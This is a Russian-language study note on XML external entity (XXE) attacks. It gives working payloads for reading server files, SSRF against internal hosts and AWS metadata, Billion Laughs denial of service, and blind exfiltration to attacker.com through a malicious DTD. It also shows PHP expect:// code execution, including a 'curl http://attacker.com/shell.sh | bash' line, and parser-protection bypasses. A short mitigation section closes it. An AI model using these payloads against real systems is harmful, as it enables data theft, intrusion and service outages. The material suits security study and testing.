### Если сайт принимает XML и не экранирует сущности — можно читать файлы сервера, бить внутренние сети (SSRF) и вызывать отказ в обслуживании.

#### XXE — это одна из самых опасных уязвимостей, потому что из чтения файлов часто превращается в RCE (если есть возможность загрузить SSH-ключ или прочесть исходники с паролями)

Стандартный XXE позволяет **читать файлы** с сервера, но не писать их : но все же есть способы писать файлы, в особых случаях
- через RCE (PHP expect)
- через SSRF во внутренние сервисы (Redis, API)
- через оставление данных в логах ошибок

```xml
<человек>
  <имя>Иван</имя>
```

**Сущности** — это переменные в XML. Внутри есть встроенные, типа `&lt;` для символа `<`. Но можно объявлять **свои**.

```xml
<!DOCTYPE foo [ <!ENTITY привет "Всем привет"> ]>
<тест>&привет;</тест>
```
вывод - Всем привет

## УЯЗВИМОСТЬ XXE
XML-парсер может **подгружать внешние ресурсы**. Если это разрешено — пипец.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<тест>&xxe;</тест>
```
###### вместо `&xxe;` подставится содержимое файла `/etc/passwd`**.

-----



>>>XML-инъекция внешней сущности (также известная как XXE) - это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в обработку XML-данных приложением. Это часто позволяет злоумышленнику просматривать файлы в файловой системе сервера приложений и взаимодействовать с любыми серверными или внешними системами, к которым может получить доступ само приложение.

также можно использовать XXE для выполнения (SSRF)

-----
>>XML - это язык, предназначенный для хранения и транспортировки данных. Как и HTML, XML использует древовидную структуру тегов и данных. В отличие от HTML, XML не использует предопределенные теги, поэтому тегам могут быть присвоены имена, которые описывают данные. Ранее в истории Интернета XML был в моде как формат передачи данных ("X" в "AJAX" означает "XML"). Но теперь его популярность снизилась в пользу формата JSON.

>>Сущности в XML — это способ представления элемента данных в XML-документе без использования самих данных. В спецификацию языка XML встроены различные сущности. Например, сущности `&lt;` и `&gt;` представляют собой символы `<` и `>`. Это метасимволы, используемые для обозначения XML-тегов, поэтому при их использовании в данных они, как правило, должны быть представлены в виде сущностей.

> Для объявления внешней сущности используется ==SYSTEM== ключевое слово, за которым следует URL-адрес, по которому должно быть загружено значение сущности. Например:

### ==<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

----

> В URL-адресе может использоваться `file://` протокол, поэтому внешние сущности могут загружаться из файла. Например:

### ==<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

## Чтение файлов (самое частое)

```xml
<!DOCTYPE root [ <!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
<данные>&file;</данные>
```

→ придет содержимое системного файла Windows.

## SSRF — стучатся туда, куда нельзя извне

```xml
<!DOCTYPE foo [ <!ENTITY admin SYSTEM "http://192.168.1.1/admin"> ]>
<запрос>&admin;</запрос>
```
Сервер сходит на внутренний IP: порт 80, 22, 3306 — **разведка сети**.

Можно даже **метаданные AWS** дёргать:
```xml
<!DOCTYPE foo [ <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

## DoS (Billion Laughs) — смех миллиарда / экпотенц нагрузка
сущности многократно ссылаются друг на друга во много слоев
Это классика. Сущность ссылается на другую, та на следующую — **экспоненциальный рост**.
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lz>&lol3;</lz>
```
Парсер пытается развернуть — **падает по памяти**. ==Сервер ложится.

# ---------------------- как найти XXE ? ---------------------
#### .Отправляем XML с внешней сущностью:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```
#### Смотрим ответ — есть файл?** → XXE найден.

**Если ответ пустой — пробуем Blind XXE:**

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ТВОЙ-САЙТ.oast.fun"> %xxe; ]>
```
→ смотрим логи OAST. Пришло — значит парсер сходил по URL.

####  Mожно ошибки провоцировать

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://МОЙ-САЙТ/?x=%file;'>">
%eval;
%exfil;
```
→ содержимое файла уйдёт мне в параметре запроса.

# ------------ особые случаи -------------

#### RCE через PHP `expect://` (если повезёт)

Если на сервере стоит PHP с модулем `expect`, XXE превращается в **полноценное выполнение команд** [](https://www.freebuf.com/articles/vuls/421770.html)[](https://timcore.ru/2026/01/10/xxe-ot-chtenija-fajlov-do-full-rce-cherez-expect/#respond):
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<data>&xxe;</data>
```

→ if выполнится команда `id`. А через `>>` или `curl` уже можно писать файлы:

```xml
<!ENTITY xxe SYSTEM "expect://curl http://attacker.com/shell.sh | bash">
```
**Условия:** PHP, модуль `expect` включён, парсер разрешает внешние сущности.

---
#### SSRF → запись через внутренние сервисы

XXE позволяет делать запросы к любым URL (SSRF) [](https://github.com/joaopedroimamura/xxe-example)[](https://www.freebuf.com/articles/vuls/421770.html)[](https://timcore.ru/2026/01/10/xxe-ot-chtenija-fajlov-do-full-rce-cherez-expect/#respond). Если внутри сети есть:

- **Админка Redis** без пароля → можно сохранить данные через `gopher://`
- **Elasticsearch** → записать документ
- **Internal API** с возможностью создания файлов

Пример записи через Redis:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "gopher://internal-redis:6379/_SET%20backdoor%20%22evil%22"> ]>
```
→ на самом деле геморройно (кодирование, длина), но технически возможно.

------

#### Запись через ошибки / логи

Можно заставить парсер обратиться к **несуществующему файлу**, имя которого содержит данные из целевого файла [](https://github.com/joaopedroimamura/xxe-example)[](https://timcore.ru/2026/01/10/xxe-ot-chtenija-fajlov-do-full-rce-cherez-expect/#respond):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM 'file:///nonexistent/%file;'>">
%error;
```

Парсер попытается открыть `/nonexistent/root:x:0:0:...` → ошибка с содержимым файла **попадёт в лог** (если логи пишутся). Это не прямая запись, но данные оседают на диске.

---

####  Запись через FTP (редко)

Некоторые парсеры поддерживают `ftp://`. Можно отправить данные на свой FTP-сервер и потом сохранить их [](https://github.com/joaopedroimamura/xxe-example)[](https://www.freebuf.com/articles/vuls/421770.html). Но это не запись на целевой сервер, а эксфильтрация.

### «неочевидные случаи»  @*из доклада Сергея Васильева Positive Technologies 

Вот список приемов, которые выходят за рамки стандартного `file:///etc/passwd`. 
#### 1 Обход через «дырявые» настройки по умолчанию

Самая частая проблема. Разработчик думает: «Я ничего не включал — значит, безопасно». А на деле — нет.

- **Java:** Парсеры в Java (особенно старые версии) из коробки могут быть опасными. Это не баг, а фича спецификации, которую разработчики забывают отключать [](https://portswigger.net/web-security/xxe/blind?source=post_page-----29d8e07259d9--------------------------------).
   
- **.NET Framework:** Классический грабли. До версии 4.5.2 `XmlDocument` был опасным по умолчанию. С 4.5.2 — стал безопасным. **НО!** Если в `web.config`прописана цель `<httpRuntime targetFramework="4.5" />`, то даже на свежем 4.6.2 парсер снова становится опасным! Код вроде безопасный, а уязвимость есть [](https://thinkloveshare.com/offenskill/enketo-auth-bypass-ssrf-xxe-and-file-read/).
   

#### 2  Атака через обходные пути (не XML файлы)

XXE живет не только в чистых XML.

- **SVG-графика:** Ты загружаешь вроде картинку (`svg`), а внутри это самый настоящий XML. Библиотеки для обработки SVG часто используют XML-парсеры, которые могут быть уязвимы. Залил красивое лого — вытащил файлы с сервера. В докладе показан пример с библиотекой `Svg.Skia` [](https://thinkloveshare.com/offenskill/enketo-auth-bypass-ssrf-xxe-and-file-read/)[](https://app.opencve.io/cve/CVE-2025-47778).
   
- **Другие форматы:** Любой формат, который внутри является XML или ZIP-архивом с XML (как `docx`, `xlsx`, `odt`, `pptx`), — это потенциальный вектор.
   

#### 3 Изощренный обход защиты парсера

В PT Swarm показали просто цирковой номер по обходу четырех уровней защиты в PHP [](https://swarm.ptsecurity.com/impossible-xxe-in-php/?utm_source=vulnverse.me&utm_medium=referral&utm_campaign=security-week-review-vulnverse-27). Смотри, как они обходили:

- **Защита 1 (запрет DTD):** Проверка `nodeType` ловила `<!DOCTYPE>`. 
- Обход — использовать **Parameter Entities (с `%`)**. Они обрабатываются на этапе загрузки, ДО того, как парсер начинает проверять структуру документа.
   
- **Защита 2 (`LIBXML_NONET`):** Флаг вроде запрещает сетевые запросы (`http://`). 
- Обход — использовать **PHP-обертки** (`php://filter/`), которые этот флаг игнорирует.
   
- **Защита 3 (первый `loadXML` без флагов):** Простое объявление сущности не срабатывало. 
- Обход — перенести определение внешней сущности в **атрибут `SYSTEM` тега `<!DOCTYPE>`**, а не внутрь DTD. Парсер сам сходит по этому URL.
   

#### 4  Слепое (Blind) извлечение данных без прямого ответа

Даже если содержимое файла не показывается в ответе, его можно украсть.

- **Через ошибки парсера:** Специально создать несуществующий файл, в имя которого подставить содержимое целевого файла. Парсер выдаст ошибку `FileNotFoundException`, в тексте которой будет нужный тебе `/etc/passwd` [](https://portswigger.net/web-security/xxe/blind?source=post_page-----29d8e07259d9--------------------------------).
   
- **Через переопределение локального DTD:** Если нельзя стучаться наружу, ищут **существующий DTD-файл на самом сервере** (например, часть софта типа GNOME). Внедряют свою DTD, которая переопределяет какую-нибудь сущность из этого локального файла, заставляя парсер выдать ошибку с данными [](https://portswigger.net/web-security/xxe/blind?source=post_page-----29d8e07259d9--------------------------------).
   

#### 5. **Эскалация до выполнения кода (RCE)**

- **PHP `expect://`:** Если на сервере установлен модуль `expect`, XXE превращается в RCE моментально [](https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation).
   
- **Цепочка с SSRF:** Через XXE можно сходить во внутренние сервисы 
- (Redis, Memcached, метаданные AWS по адресу `http://169.254.169.254/`) и, например, проложить там веб-шелл или украсть ключи [](https://thinkloveshare.com/offenskill/enketo-auth-bypass-ssrf-xxe-and-file-read/)[](https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation).
   

###  + выводы

1. **XXE — это не только чтение файлов:** Это SSRF, DoS («billion laughs»), а иногда и RCE.
   
2. **Проблема не только в коде, но и в окружении:** Версии фреймворков, глобальные конфиги (`web.config`), сторонние библиотеки — все имеет значение.
   
3. **Обход защиты — это норма:** То, что парсер что-то «не должен» делать, не значит, что он этого не сделает. Parameter entities, PHP-обертки, локальные DTD — все это инструменты обхода.
   
4. **Слепая эксплуатация — не приговор:** OOB-взаимодействия, ошибки парсера, лоальные DTD позволяют украсть данные даже без прямого вывода.
   
5. **Формат — не гарантия безопасности:** Картинки (SVG), офисные документы — те же XML.
   

**Как избежать:**

- **Отключайте сущности и DTD везде, где можно.** Не надейтесь на «безопасные» настройки по умолчанию, проверяйте документацию под свою версию [](https://docs.stackhawk.com/vulnerabilities/90023/#risks)[](https://django-modern-rpc.readthedocs.io/latest/misc/security.html#notes).
   
- **Используйте безопасные аналоги:** В Python — `defusedxml`, в Java — правильно настроенные фабрики, в .NET — `XmlReader` с `XmlReaderSettings` и `ProhibitDtd = true` [](https://django-modern-rpc.readthedocs.io/latest/misc/security.html#notes).
   
- **Регулярно обновляйте** фреймворки и библиотеки.
   
- **Сегментируйте сеть**, чтобы даже в случае SSRF нельзя было достучаться до критичных внутренних сервисов.

# КРАТКО ВЫВОДЫ как ИСКАТЬ
## ### Главные "сетевые" и "файловые" конструкции XML

###### Когда видим, что приложение принимает XML, то алгоритм действий:
1. Проверяй DOCTYPE. Есть ли он?
		 Есть ли внутри ==ENTITY== с ==SYSTEM== ?
2. Пробую базовые протоколы: 
			 `file:///etc/passwd`,
			 `http://localhost:8080/`, 
			 `http://ТВОЙ-СЕРВЕР.oast.fun/`.
3. Если не работает, пробую параметрические сущности.Это стандартный способ для Blind XXE.
4. Пробую XInclude. Это отдельный вектор, который часто забывают.
5. Изучаю нестандартные протоколы/обертки в зависимости от технологии бэкенда                             (PHP, Java, .NET).
6. Смотрю на ошибки. Иногда сервер в ответе может выдать путь к файлу или показать, что он пытался открыть.

#### Внешние сущности (SYSTEM) — **Классика XXE**
**Опасность:** Чтение локальных файлов `(file://`) и SSRF через `http://` во внутренние сети:

Объявляются ==в DTD== и позволяют подгружать данные по URL или из файла.
- **Синтаксис:** `<!ENTITY имя_сущности SYSTEM "URI">`
- Внутри тегов через `&имя_сущности;`
- - Ищем в запросах: DOCTYPE с `SYSTEM` и протоколами `file://`, `http://`, `https://`, `ftp://`.
пример 
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

```
--------
#### Параметрические сущности (Parameter Entities) — **Для слепых атак**

 DTD, где одна сущность вызывает другую, которая делает запрос наружу.
Используются только ==внутри DTD==^  позволяют делать Out-of-Band (OOB) запр
**Синтаксис:** `<!ENTITY % имя_сущности SYSTEM "URI">` (процент перед именем важно)
**Использование:** `%имя_сущности;` — тоже внутри DTD

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

-------------------------------------------------
_в `evil.dtd`?_  там примерно такое:

<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

```
Сервер сходит на твой сайт и в параметре запроса передаст содержимое файла [](https://cloud.tencent.cn/developer/ask/sof/106513665?from=16139)[](https://www.securitylab.ru/analytics/454815.php?el_id=454815&VOTE_ID=101&view_result=Y).

--------
#### DOCTYPE с внешним DTD (SYSTEM / PUBLIC)
Сервер скачает твой DTD-файл, в котором могут быть объявлены свои сущности. Это тоже SSRF&.
Сам корневой элемент `DOCTYPE` может ссылаться на внешний файл с правилами

- **Синтаксис:** `<!DOCTYPE корневой_элемент SYSTEM "URI_DTD-файла">`
- **Что ищем:** Сам DOCTYPE содержит ссылку на внешний ресурс.
Пример:
```xml
<!DOCTYPE root SYSTEM "http://attacker.com/malicious.dtd">
<root>
  <data>test</data>
</root>
```


---------
#### Схемы (XSD) и их импорты
XML-схемы (`*.xsd`) — это тоже XML. Они могут импортировать другие схемы по сети.
- **Синтаксис:** `<xsd:import namespace="..." schemaLocation="URL"/>` или `<xsd:include schemaLocation="URL"/>`

- Как искать?: XML-документы, которые ссылаются на схему (`xsi:schemaLocation`), или если само приложение грузит схему, а мы можем влиять на путь.

-----
#### XInclude — **Отдельная тема!**  вот тут лаба:  [[3_XML_(XXE)]]
Это отдельный стандарт для включения кусков XML из других файлов. Может работать даже если DTD отключен!

- **Синтаксис:** `<xi:include href="URI" parse="xml|text"/>` (нужно объявить пространство имен `xmlns:xi="http://www.w3.org/2001/XInclude"`)

- Как искать?:** Теги `<xi:include>`.
пример:
```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```
 Позволяет читать файлы даже при отключенных DTD

####  Специфические API и Resolver"ы (продвинутый уровень)
В некоторых языках и библиотеках есть свои механизмы. Самый яркий пример — PHP-обертки. Даже если `file://` заблокирован, могут сработать другие.

- **Синтаксис:** `php://filter/convert.base64-encode/resource=/etc/passwd`
- **Где вставляем:** Всё туда же, в `SYSTEM "..."`.

Пример XXE через PHP:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```
Обход фильтров, доступ к нестандартным источникам данных
